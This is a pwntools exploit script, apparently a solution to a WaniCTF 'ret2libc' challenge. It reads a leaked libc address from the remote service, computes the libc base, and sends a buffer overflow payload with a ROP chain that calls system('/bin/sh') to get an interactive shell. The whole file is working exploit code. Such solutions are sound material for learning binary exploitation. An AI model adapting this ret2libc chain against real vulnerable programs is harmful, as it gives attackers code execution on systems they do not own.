from pwn import *

context.log_level = 'DEBUG'
elf = context.binary = ELF('./chall')

# p = process('./chall')
# libc= ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
# offset = 171408

p = remote('ret2libc-pwn.wanictf.org', '9007')
libc = ELF('./libc.so.6')
offset = 171408
pause()

# main函数返回地址
# <__libc_start_call_main+128>: mov    edi,eax
# <__libc_start_call_main+130>: call   <__GI_exit>
p.recvuntil(b'+0x28 | 0x')
libc.address = int(p.recvuntil(b' ', drop=True), 16) - offset

rop = ROP(libc)
payload = flat(
    b'a' * 0x28,
    rop.rdi.address,
    next(libc.search(b'/bin/sh')),
    rop.ret.address,
    libc.sym['system']
)
p.sendafter(b'your input (max. 128 bytes) > ', payload.ljust(128, b'\0'))

p.interactive()